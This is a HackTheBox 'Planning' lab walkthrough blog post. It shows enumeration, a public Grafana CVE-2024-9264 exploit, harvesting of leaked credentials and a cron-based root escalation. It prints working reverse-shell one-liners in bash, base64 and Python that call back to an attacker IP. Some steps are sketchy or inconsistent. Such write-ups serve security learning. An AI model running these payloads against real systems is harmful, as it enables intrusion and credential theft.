---
layout: post  # Use your theme's default post layout, or 'page' if it's a static page
title: "HackTheBox Planning Walkthrough - Pentest Lab Notes"
date: 2025-09-23 12:00:00 -0500  # Adjust timezone if needed
categories: [hackthebox, walkthrough]
tags: ctf, enumeration, exploit, planning, writeups, htb, writeups 
author: h4ck3rfirst
---

# 🛡️ HackTheBox - Planning

**Difficulty:** Easy  
**Category:** Comprehensive Penetration  
**Target Machine:** `planning.htb`  OR  10.10.11.68

## 📌 Overview

This HackTheBox machine focuses on web and infrastructure enumeration, subdomain discovery, public exploit usage, and privilege escalation via credential leakage and insecure crontab handling.


## 🕵️ Recon & Enumeration

### 🔍 Open Ports

```
nmap -sV -v -p- 10 10.10.11.68 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-13 11:36 IST
Nmap scan report for planning.htb (10.10.11.68)
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Nmap done: 1 IP address (1 host up) scanned in 2.77 seconds  

### 🌐 Web Analysis (`http://planning.htb`)

- The HTTP service provided minimal functionality.
- Queries returned no useful data.
- Directory brute-forcing and injection attempts were unsuccessful.
- Switched focus to **subdomain enumeration**.

---

### 🌐 Subdomain Discovery
```
┌──(kali㉿kali)-[/media/…/ctf/hackthebox/planning/CVE-2024-9264]
└─$ ffuf -w /home/kali/Desktop/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://planning.htb' -H "Host: FUZZ.planning.htb" -fs 178

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://planning.htb
 :: Wordlist         : FUZZ: /home/kali/Desktop/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.planning.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 121ms]
:: Progress: [4990/4990] :: Job [1/1] :: 350 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```
### Discovered: `http://grafana.planning.htb`

- Found a **Grafana login form**
- **Credentials (from challenge prompt):**

Username: admin
Password: 0D5oT70Fq13EvB5r


- After login:
- Found **Grafana version**: `v11.0.0 (83b9528bce)`
- Vulnerable to **CVE-2024-9264** (RCE)
- 
```
git clone https://github.com/nollium/CVE-2024-9264.git
```
## Inital Foothold
### 🔥 RCE Exploit Used

```
┌──(venv)─(kali㉿kali)-[/media/…/ctf/hackthebox/planning/CVE-2024-9264]
└─$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r  -f /etc/passwd http://grafana.planning.htb 
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Reading file: /etc/passwd
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/etc/passwd'):
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
grafana:x:472:0::/home/grafana:/usr/sbin/nologin
```
To get Server access  

```bash
┌──(venv)─(kali㉿kali)-[/media/…/ctf/hackthebox/planning/CVE-2024-9264]
└─$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r \
  -c "bash -c 'bash -i >& /dev/tcp/10.10.16.81/9001 0>&1'"  \
  http://grafana.planning.htb
 
```
or We can use encode version of this 

```
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r  -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44MS85MDAxIDA+JjE= | base64 -d | bash"  http://grafana.planning.htb
```
reverse shell 
 
```
┌──(kali㉿kali)-[/media/…/ctf/hackthebox/planning/CVE-2024-9264]
└─$ rlwrap  nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.81] from (UNKNOWN) [10.10.11.68] 51210
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell

root@7ce659d667d7:~#

```
### ✅ Result: Reverse shell access as root, inside a Docker container

**🐳 Docker Enumeration**

After 10+ hours of recon, environment inspection revealed plaintext credentials:  

I found i can run linpeas their i git 

```
root@7ce659d667d7:~/conf# env
env
AWS_AUTH_SESSION_DURATION=15m                                                                                                                  
HOSTNAME=7ce659d667d7
PWD=/usr/share/grafana/conf
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_HOME=/usr/share/grafana
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
HOME=/usr/share/grafana
AWS_AUTH_EXTERNAL_ID=
SHLVL=2
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_LOGS=/var/log/grafana
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
_=/usr/bin/env
OLDPWD=/usr/share/grafana
```

#### Used to login via SSH:

## ✅ User shell gained

```
┌──(kali㉿kali)-[/media/…/ctf/hackthebox/planning/CVE-2024-9264]
└─$ ssh enzo@planning.htb 
The authenticity of host 'planning.htb (10.10.11.68)' can't be established.
ED25519 key fingerprint is SHA256:iDzE/TIlpufckTmVF0INRVDXUEu/k2y3KbqA/NDvRXw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'planning.htb' (ED25519) to the list of known hosts.
enzo@planning.htb's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Sep 13 07:32:17 AM UTC 2025

  System load:  0.28              Processes:             310
  Usage of /:   71.1% of 6.30GB   Users logged in:       1
  Memory usage: 52%               IPv4 address for eth0: 10.10.11.68
  Swap usage:   13%

  => There are 44 zombie processes.


Expanded Security Maintenance for Applications is not enabled.

102 updates can be applied immediately.
77 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sat Sep 13 07:32:18 2025 from 10.10.16.81
enzo@planning:~$ ls
user.txt
```

**📄 user.txt captured**


## ⚙️ Privilege Escalation

**Download and Running linpeas and run it found **

🛢️ MySQL Discovery

```
Netid          State           Recv-Q          Send-Q                   Local Address:Port                       Peer Address:Port          Process

 udp            UNCONN          0               0                           127.0.0.54:domain                          0.0.0.0:*

 udp            UNCONN          0               0                        127.0.0.53%lo:domain                          0.0.0.0:*

tcp            LISTEN          0               4096                     127.0.0.53%lo:domain                          0.0.0.0:*

tcp            LISTEN          0               511                            0.0.0.0:http                            0.0.0.0:*

tcp            LISTEN          0               4096                         127.0.0.1:3000                            0.0.0.0:*

tcp            LISTEN          0               511                          127.0.0.1:8000                            0.0.0.0:*

tcp            LISTEN          0               151                          127.0.0.1:mysql                           0.0.0.0:*

tcp            LISTEN          0               4096                         127.0.0.1:42051                           0.0.0.0:*

tcp            LISTEN          0               4096                        127.0.0.54:domain                          0.0.0.0:*

tcp            LISTEN          0               70                           127.0.0.1:33060                           0.0.0.0:*

tcp            LISTEN          0               4096                                 *:ssh                                                         
```

### Crontab  Found 

Discovered crontab jobs in /opt/crontabs/crontab.db:

 Used with root to log in to the restricted web interface
   
```
╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /opt/crontabs/crontab.db: New Line Delimited JSON text data                                                                              
Found /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 5, database pages 967, cookie 0x4, schema 4, UTF-8, version-valid-for 5
Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 6, database pages 16, cookie 0x5, schema 4, UTF-8, version-valid-for 6
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 5, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 5
```

   Web config file exposed credentials:

```
enzo@planning:/opt/crontabs$ cat crontab.db 
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```
   Logged into MySQL, but could not write a webshell or escalate further from here.

**🔐 Port Forwarding to Port 8000**

```
ssh -L 8000:127.0.0.1:8000 e--o@10.10.11.68 -N
```
   Found a new login panel on localhost:8000

   None of the known credentials worked here

### 🚀 Final Exploitation to Root

   Uploaded reverse shell payload via cron configuration:
    
```
python3 -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.44',9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```
### ✅ Root shell obtained

```
enzo@planning:/tmp$ bash -p
bash: /bash: No such file or directory
enzo@planning:/tmp$ 
enzo@planning:~$ /tmp/bash -p
bash-5.2# ls
bash
FYyQq6kcae4CTKlC.stderr
FYyQq6kcae4CTKlC.stdout
lyqm3Iah0dEUqK3M.stderr
lyqm3Iah0dEUqK3M.stdout
pe1VfTlXTV7HCjzP.stderr
pe1VfTlXTV7HCjzP.stdout
rootbash
ssh-PzP06Tegd13G
systemd-private-00288c19c9a34ecd93f2e0d7597deb4c-ModemManager.service-g494eX
systemd-private-00288c19c9a34ecd93f2e0d7597deb4c-polkit.service-Y7G0Wx
systemd-private-00288c19c9a34ecd93f2e0d7597deb4c-systemd-logind.service-8GTtlL
systemd-private-00288c19c9a34ecd93f2e0d7597deb4c-systemd-resolved.service-ehyoQy
systemd-private-00288c19c9a34ecd93f2e0d7597deb4c-systemd-timesyncd.service-62Ww0M
systemd-private-00288c19c9a34ecd93f2e0d7597deb4c-upower.service-bPmFWq
tmux-1000
vmware-root_739-4248680507
YvZsUUfEXayH6lLj.stderr
YvZsUUfEXayH6lLj.stdout
bash-5.2# id
uid=1000(enzo) gid=1000(enzo) euid=0(root) groups=1000(enzo)
bash-5.2# cat /root/root.txt

```
**📄 root.txt captured**

## ✅ Summary

Stage	Outcome

Port Scan	Found 22, 80

Subdomain Enum	Found grafana.planning.htb

Grafana Exploit	CVE-2024-9264 (RCE)

Docker Environment	Found enzo credentials

SSH Access	Gained user shell

MySQL Credentials	Accessed DB, no PE

Crontab Analysis	Found root web creds

Cron RCE	Gained root shell

### 🧠 Lessons Learned

   🔍 Subdomain enumeration can be the key to progress

   📦 Docker environments often mask privilege boundaries

   🧬 Environment variables may leak credentials

   🕓 Crontab and ZIP file misconfigurations are powerful PE vectors

   🔐 Always test all found credentials across services

### 📁 Files & Exploits

   CVE-2024-9264 Exploit 

   Custom reverse shell payload via Python
